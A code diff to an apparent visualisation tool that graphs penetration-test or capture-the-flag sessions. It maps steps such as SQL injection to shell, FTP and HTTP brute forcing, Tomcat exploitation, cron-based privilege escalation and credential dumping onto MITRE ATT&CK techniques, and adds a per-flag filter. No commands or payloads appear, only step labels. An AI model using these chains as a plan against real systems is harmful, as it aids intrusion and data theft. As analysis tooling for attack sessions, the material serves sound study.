-      "source": "effect::shellAccessGained",
-      "target": "action::checkSudoPrivileges",
+      "source": "effect::osShellAccess",
+      "target": "action::enumerateCronJobs",
       "type": "enables",
       "layer": "actions"
     },
     {
-      "source": "action::findSUIDBinaries",
-      "target": "effect::suidBinariesFound",
+      "source": "effect::currentUserIdentified",
+      "target": "action::enumerateCronJobs",
+      "type": "enables",
+      "layer": "actions"
+    },
+    {
+      "source": "action::escalatePrivileges",
+      "target": "effect::privilegesEscalated",
       "type": "produces",
       "layer": "actions"
     },
     {
-      "source": "effect::shellAccessGained",
-      "target": "action::findSUIDBinaries",
-      "type": "enables",
-      "layer": "actions"
-    },
-    {
-      "source": "action::exploitSUID",
+      "source": "action::escalatePrivileges",
       "target": "effect::rootAccessGained",
       "type": "produces",
       "layer": "actions"
     },
     {
-      "source": "effect::suidBinariesFound",
-      "target": "action::exploitSUID",
+      "source": "effect::writableCronJobFound",
+      "target": "action::escalatePrivileges",
       "type": "enables",
       "layer": "actions"
     },
     {
-      "source": "action::captureFlag",
-      "target": "effect::flagFound",
+      "source": "action::readSensitiveFile",
+      "target": "effect::passwdFileRead",
       "type": "produces",
       "layer": "actions"
     },
     {
-      "source": "effect::rootAccessGained",
-      "target": "action::captureFlag",
+      "source": "effect::osShellAccess",
+      "target": "action::readSensitiveFile",
       "type": "enables",
+      "layer": "actions"
+    },
+    {
+      "source": "effect::privilegesEscalated",
+      "target": "action::readSensitiveFile",
+      "type": "enables",
+      "layer": "actions"
+    },
+    {
+      "source": "action::readCrontab",
+      "target": "effect::cronJobsEnumerated",
+      "type": "produces",
       "layer": "actions"
     },
     {
       "source": "effect::shellAccessGained",
-      "target": "action::captureFlag",
+      "target": "action::readCrontab",
       "type": "enables",
       "layer": "actions"
     },
     {
-      "source": "mitre::T1046",
+      "source": "action::bruteForceFTP",
+      "target": "effect::ftpCredentialsObtained",
+      "type": "produces",
+      "layer": "actions"
+    },
+    {
+      "source": "effect::openPortsKnown",
+      "target": "action::bruteForceFTP",
+      "type": "enables",
+      "layer": "actions"
+    },
+    {
+      "source": "action::scanForOpenPort",
+      "target": "effect::ftpHostsIdentified",
+      "type": "produces",
+      "layer": "actions"
+    },
+    {
+      "source": "action::exploitTomcatManager",
+      "target": "effect::meterpreterSessionEstablished",
+      "type": "produces",
+      "layer": "actions"
+    },
+    {
+      "source": "action::exploitTomcatManager",
+      "target": "effect::shellAccessGained",
+      "type": "produces",
+      "layer": "actions"
+    },
+    {
+      "source": "action::searchFileSystem",
+      "target": "effect::flagFileLocated",
+      "type": "produces",
+      "layer": "actions"
+    },
+    {
+      "source": "effect::shellAccessGained",
+      "target": "action::searchFileSystem",
+      "type": "enables",
+      "layer": "actions"
+    },
+    {
+      "source": "action::exploitSQLInjection",
+      "target": "effect::sqlInjectionConfirmed",
+      "type": "produces",
+      "layer": "actions"
+    },
+    {
+      "source": "action::exploitSQLInjection",
+      "target": "effect::databasesEnumerated",
+      "type": "produces",
+      "layer": "actions"
+    },
+    {
+      "source": "action::enumerateTables",
+      "target": "effect::tablesEnumerated",
+      "type": "produces",
+      "layer": "actions"
+    },
+    {
+      "source": "effect::databasesEnumerated",
+      "target": "action::enumerateTables",
+      "type": "enables",
+      "layer": "actions"
+    },
+    {
+      "source": "action::dumpDatabase",
+      "target": "effect::databaseDumped",
+      "type": "produces",
+      "layer": "actions"
+    },
+    {
+      "source": "action::dumpDatabase",
+      "target": "effect::dbCredentialsDumped",
+      "type": "produces",
+      "layer": "actions"
+    },
+    {
+      "source": "effect::tablesEnumerated",
+      "target": "action::dumpDatabase",
+      "type": "enables",
+      "layer": "actions"
+    },
+    {
+      "source": "effect::databasesEnumerated",
+      "target": "action::dumpDatabase",
+      "type": "enables",
+      "layer": "actions"
+    },
+    {
+      "source": "mitre::T1190",
       "target": "mitre::T1083",
       "type": "sequence",
       "layer": "mitre"
     },
     {
       "source": "mitre::T1083",
-      "target": "mitre::T1595.003",
+      "target": "mitre::T1082",
       "type": "sequence",
       "layer": "mitre"
     },
     {
-      "source": "mitre::T1595.003",
-      "target": "mitre::T1110.001",
-      "type": "sequence",
-      "layer": "mitre"
-    },
-    {
-      "source": "mitre::T1110.001",
-      "target": "mitre::T1078",
-      "type": "sequence",
-      "layer": "mitre"
-    },
-    {
-      "source": "mitre::T1078",
-      "target": "mitre::T1033",
-      "type": "sequence",
-      "layer": "mitre"
-    },
-    {
-      "source": "mitre::T1033",
-      "target": "mitre::T1548.003",
-      "type": "sequence",
-      "layer": "mitre"
-    },
-    {
-      "source": "mitre::T1548.003",
-      "target": "mitre::T1548.001",
-      "type": "sequence",
-      "layer": "mitre"
-    },
-    {
-      "source": "cmd::0",
-      "target": "action::scanAllPorts",
-      "type": "maps_to",
-      "layer": "cross"
-    },
-    {
-      "source": "cmd::0",
+      "source": "mitre::T1082",
       "target": "mitre::T1046",
-      "type": "maps_to",
-      "layer": "cross"
+      "type": "sequence",
+      "layer": "mitre"
     },
     {
-      "source": "cmd::1",
-      "target": "action::identifyServices",
-      "type": "maps_to",
-      "layer": "cross"
+      "source": "mitre::T1046",
+      "target": "mitre::T1110",
+      "type": "sequence",
+      "layer": "mitre"
     },
     {
-      "source": "cmd::1",
-      "target": "mitre::T1046",
+      "source": "mitre::T1110",
+      "target": "mitre::T1098",
+      "type": "sequence",
+      "layer": "mitre"
+    },
+    {
+      "source": "mitre::T1098",
+      "target": "mitre::T1003.008",
+      "type": "sequence",
+      "layer": "mitre"
+    },
+    {
+      "source": "mitre::T1003.008",
+      "target": "mitre::T1053.003",
+      "type": "sequence",
+      "layer": "mitre"
+    },
+    {
+      "source": "mitre::T1053.003",
+      "target": "mitre::T1059.002",
+      "type": "sequence",
+      "layer": "mitre"
+    },
+    {
+      "source": "mitre::T1059.002",
+      "target": "mitre::T1005",
+      "type": "sequence",
+      "layer": "mitre"
+    },
+    {
+      "source": "mitre::T1005",
+      "target": "mitre::T1552.001",
+      "type": "sequence",
+      "layer": "mitre"
+    },
+    {
+      "source": "cmd::2",
+      "target": "action::exploitSQLiOSShell",
       "type": "maps_to",
       "layer": "cross"
     },
     {
       "source": "cmd::2",
-      "target": "action::enumerateWebDirs",
-      "type": "maps_to",
-      "layer": "cross"
-    },
-    {
-      "source": "cmd::2",
-      "target": "mitre::T1083",
+      "target": "mitre::T1190",
       "type": "maps_to",
       "layer": "cross"
     },
     {
       "source": "cmd::3",
-      "target": "action::scanWebVulnerabilities",
+      "target": "action::listDirectory",
       "type": "maps_to",
       "layer": "cross"
     },
     {
       "source": "cmd::3",
-      "target": "mitre::T1595.003",
-      "type": "maps_to",
-      "layer": "cross"
-    },
-    {
-      "source": "cmd::4",
-      "target": "action::bruteForceWebLogin",
-      "type": "maps_to",
-      "layer": "cross"
-    },
-    {
-      "source": "cmd::4",
-      "target": "mitre::T1110.001",
-      "type": "maps_to",
-      "layer": "cross"
-    },
-    {
-      "source": "cmd::5",
-      "target": "action::loginSSH",
-      "type": "maps_to",
-      "layer": "cross"
-    },
-    {
-      "source": "cmd::5",
-      "target": "mitre::T1078",
-      "type": "maps_to",
-      "layer": "cross"
-    },
-    {
-      "source": "cmd::6",
-      "target": "action::gatherSystemInfo",
-      "type": "maps_to",
-      "layer": "cross"
-    },
-    {
-      "source": "cmd::6",
-      "target": "mitre::T1033",
-      "type": "maps_to",
-      "layer": "cross"
-    },
-    {
-      "source": "cmd::7",
-      "target": "action::gatherSystemInfo",
-      "type": "maps_to",
-      "layer": "cross"
-    },
-    {
-      "source": "cmd::7",
-      "target": "mitre::T1033",
-      "type": "maps_to",
-      "layer": "cross"
-    },
-    {
-      "source": "cmd::8",
-      "target": "action::checkSudoPrivileges",
-      "type": "maps_to",
-      "layer": "cross"
-    },
-    {
-      "source": "cmd::8",
-      "target": "mitre::T1548.003",
-      "type": "maps_to",
-      "layer": "cross"
-    },
-    {
-      "source": "cmd::9",
-      "target": "action::findSUIDBinaries",
-      "type": "maps_to",
-      "layer": "cross"
-    },
-    {
-      "source": "cmd::9",
-      "target": "mitre::T1548.001",
-      "type": "maps_to",
-      "layer": "cross"
-    },
-    {
-      "source": "cmd::10",
-      "target": "action::exploitSUID",
-      "type": "maps_to",
-      "layer": "cross"
-    },
-    {
-      "source": "cmd::10",
-      "target": "mitre::T1548.001",
-      "type": "maps_to",
-      "layer": "cross"
-    },
-    {
-      "source": "cmd::11",
-      "target": "action::captureFlag",
-      "type": "maps_to",
-      "layer": "cross"
-    },
-    {
-      "source": "cmd::11",
       "target": "mitre::T1083",
       "type": "maps_to",
       "layer": "cross"
     },
     {
-      "source": "cmd::12",
-      "target": "action::captureFlag",
+      "source": "cmd::4",
+      "target": "action::checkWorkingDirectory",
       "type": "maps_to",
       "layer": "cross"
     },
     {
-      "source": "cmd::12",
+      "source": "cmd::4",
+      "target": "mitre::T1082",
+      "type": "maps_to",
+      "layer": "cross"
+    },
+    {
+      "source": "cmd::6",
+      "target": "action::listDirectory",
+      "type": "maps_to",
+      "layer": "cross"
+    },
+    {
+      "source": "cmd::6",
       "target": "mitre::T1083",
+      "type": "maps_to",
+      "layer": "cross"
+    },
+    {
+      "source": "cmd::10",
+      "target": "action::scanNetwork",
+      "type": "maps_to",
+      "layer": "cross"
+    },
+    {
+      "source": "cmd::10",
+      "target": "mitre::T1046",
+      "type": "maps_to",
+      "layer": "cross"
+    },
+    {
+      "source": "cmd::11",
+      "target": "action::bruteForceHTTP",
+      "type": "maps_to",
+      "layer": "cross"
+    },
+    {
+      "source": "cmd::11",
+      "target": "mitre::T1110",
+      "type": "maps_to",
+      "layer": "cross"
+    },
+    {
+      "source": "cmd::13",
+      "target": "action::exploitSQLiOSShell",
+      "type": "maps_to",
+      "layer": "cross"
+    },
+    {
+      "source": "cmd::13",
+      "target": "mitre::T1190",
+      "type": "maps_to",
+      "layer": "cross"
+    },
+    {
+      "source": "cmd::14",
+      "target": "action::checkCurrentUser",
+      "type": "maps_to",
+      "layer": "cross"
+    },
+    {
+      "source": "cmd::14",
+      "target": "mitre::T1082",
+      "type": "maps_to",
+      "layer": "cross"
+    },
+    {
+      "source": "cmd::15",
+      "target": "action::checkCurrentUser",
+      "type": "maps_to",
+      "layer": "cross"
+    },
+    {
+      "source": "cmd::15",
+      "target": "mitre::T1082",
+      "type": "maps_to",
+      "layer": "cross"
+    },
+    {
+      "source": "cmd::17",
+      "target": "action::enumerateCronJobs",
+      "type": "maps_to",
+      "layer": "cross"
+    },
+    {
+      "source": "cmd::17",
+      "target": "mitre::T1083",
+      "type": "maps_to",
+      "layer": "cross"
+    },
+    {
+      "source": "cmd::18",
+      "target": "action::escalatePrivileges",
+      "type": "maps_to",
+      "layer": "cross"
+    },
+    {
+      "source": "cmd::18",
+      "target": "mitre::T1098",
+      "type": "maps_to",
+      "layer": "cross"
+    },
+    {
+      "source": "cmd::19",
+      "target": "action::readSensitiveFile",
+      "type": "maps_to",
+      "layer": "cross"
+    },
+    {
+      "source": "cmd::19",
+      "target": "mitre::T1003.008",
+      "type": "maps_to",
+      "layer": "cross"
+    },
+    {
+      "source": "cmd::21",
+      "target": "action::readCrontab",
+      "type": "maps_to",
+      "layer": "cross"
+    },
+    {
+      "source": "cmd::21",
+      "target": "mitre::T1053.003",
+      "type": "maps_to",
+      "layer": "cross"
+    },
+    {
+      "source": "cmd::39",
+      "target": "action::bruteForceFTP",
+      "type": "maps_to",
+      "layer": "cross"
+    },
+    {
+      "source": "cmd::39",
+      "target": "mitre::T1110",
+      "type": "maps_to",
+      "layer": "cross"
+    },
+    {
+      "source": "cmd::40",
+      "target": "action::scanForOpenPort",
+      "type": "maps_to",
+      "layer": "cross"
+    },
+    {
+      "source": "cmd::40",
+      "target": "mitre::T1046",
+      "type": "maps_to",
+      "layer": "cross"
+    },
+    {
+      "source": "cmd::42",
+      "target": "action::exploitTomcatManager",
+      "type": "maps_to",
+      "layer": "cross"
+    },
+    {
+      "source": "cmd::42",
+      "target": "mitre::T1059.002",
+      "type": "maps_to",
+      "layer": "cross"
+    },
+    {
+      "source": "cmd::43",
+      "target": "action::searchFileSystem",
+      "type": "maps_to",
+      "layer": "cross"
+    },
+    {
+      "source": "cmd::43",
+      "target": "mitre::T1083",
+      "type": "maps_to",
+      "layer": "cross"
+    },
+    {
+      "source": "cmd::46",
+      "target": "action::exploitSQLInjection",
+      "type": "maps_to",
+      "layer": "cross"
+    },
+    {
+      "source": "cmd::46",
+      "target": "mitre::T1190",
+      "type": "maps_to",
+      "layer": "cross"
+    },
+    {
+      "source": "cmd::47",
+      "target": "action::enumerateTables",
+      "type": "maps_to",
+      "layer": "cross"
+    },
+    {
+      "source": "cmd::47",
+      "target": "mitre::T1190",
+      "type": "maps_to",
+      "layer": "cross"
+    },
+    {
+      "source": "cmd::48",
+      "target": "action::dumpDatabase",
+      "type": "maps_to",
+      "layer": "cross"
+    },
+    {
+      "source": "cmd::48",
+      "target": "mitre::T1005",
+      "type": "maps_to",
+      "layer": "cross"
+    },
+    {
+      "source": "cmd::49",
+      "target": "action::dumpDatabase",
+      "type": "maps_to",
+      "layer": "cross"
+    },
+    {
+      "source": "cmd::49",
+      "target": "mitre::T1552.001",
+      "type": "maps_to",
+      "layer": "cross"
+    },
+    {
+      "source": "cmd::50",
+      "target": "action::exploitSQLInjection",
+      "type": "maps_to",
+      "layer": "cross"
+    },
+    {
+      "source": "cmd::50",
+      "target": "mitre::T1190",
+      "type": "maps_to",
+      "layer": "cross"
+    },
+    {
+      "source": "cmd::51",
+      "target": "action::dumpDatabase",
+      "type": "maps_to",
+      "layer": "cross"
+    },
+    {
+      "source": "cmd::51",
+      "target": "mitre::T1005",
       "type": "maps_to",
       "layer": "cross"
     }
@@ -1565,6 +3802,7 @@ const GRAPH = {
 const COLOR_MAPS = GRAPH.color_maps;
 
 let activeLayer = 'command';
+let selectedFlag = null;
 let simulation = null;
 
 // ── SVG setup ──────────────────────────────────────────────────────────────
@@ -1591,6 +3829,28 @@ const nodeGroup = container.append('g').attr('class', 'nodes');
 document.getElementById('meta-text').textContent =
   `${GRAPH.meta.total_entries} entries · ${GRAPH.meta.source_files.length} file(s)`;
 
+// ── Flag filter ────────────────────────────────────────────────────────────
+function renderFlagButtons() {
+  const bar = document.getElementById('flag-bar');
+  const files = GRAPH.meta.source_files;
+  if (files.length <= 1) { bar.style.display = 'none'; return; }
+
+  const flagName = f => f.replace(/[.]txt$/i, '');
+  let html = `<button class="flag-btn active" data-flag="">All</button>`;
+  html += files.map(f => `<button class="flag-btn" data-flag="${f}">${flagName(f)}</button>`).join('');
+  bar.innerHTML = html;
+
+  bar.querySelectorAll('.flag-btn').forEach(btn => {
+    btn.addEventListener('click', () => {
+      bar.querySelectorAll('.flag-btn').forEach(b => b.classList.remove('active'));
+      btn.classList.add('active');
+      selectedFlag = btn.dataset.flag || null;
+      closePanel();
+      renderGraph();
+    });
+  });
+}
+
 // ── Layer toggle ───────────────────────────────────────────────────────────
 document.querySelectorAll('.layer-btn').forEach(btn => {
   btn.addEventListener('click', () => {
@@ -1605,10 +3865,32 @@ document.querySelectorAll('.layer-btn').forEach(btn => {
 
 // ── Graph rendering ────────────────────────────────────────────────────────
 function getVisibleNodes() {
-  if (activeLayer === 'command') return GRAPH.nodes;
-  if (activeLayer === 'mitre')   return GRAPH.mitre_nodes;
-  if (activeLayer === 'actions') return GRAPH.actions_effects_nodes;
-  return [];
+  let nodes;
+  if (activeLayer === 'command')      nodes = GRAPH.nodes;
+  else if (activeLayer === 'mitre')   nodes = GRAPH.mitre_nodes;
+  else                                nodes = GRAPH.actions_effects_nodes;
+
+  if (!selectedFlag) return nodes;
+
+  const flagEids = new Set(
+    GRAPH.nodes.filter(n => n.source_file === selectedFlag).map(n => n.entry_id)
+  );
+
+  if (activeLayer === 'command') return nodes.filter(n => n.source_file === selectedFlag);
+
+  if (activeLayer === 'mitre') return nodes.filter(n => (n.entry_ids || []).some(eid => flagEids.has(eid)));
+
+  if (activeLayer === 'actions') {
+    const visibleActions = new Set(
+      nodes.filter(n => n.node_type === 'action' && (n.entry_ids || []).some(eid => flagEids.has(eid))).map(n => n.name)
+    );
+    return nodes.filter(n =>
+      n.node_type === 'action'
+        ? visibleActions.has(n.name)
+        : (n.produced_by || []).some(a => visibleActions.has(a)) || (n.enables_actions || []).some(a => visibleActions.has(a))
+    );
+  }
+  return nodes;
 }
 
 function getVisibleEdges(nodeIds) {
@@ -1884,6 +4166,7 @@ function renderLegend() {
 }
 
 // ── Init ───────────────────────────────────────────────────────────────────
+renderFlagButtons();
 renderGraph();
 renderLegend();
 </script>
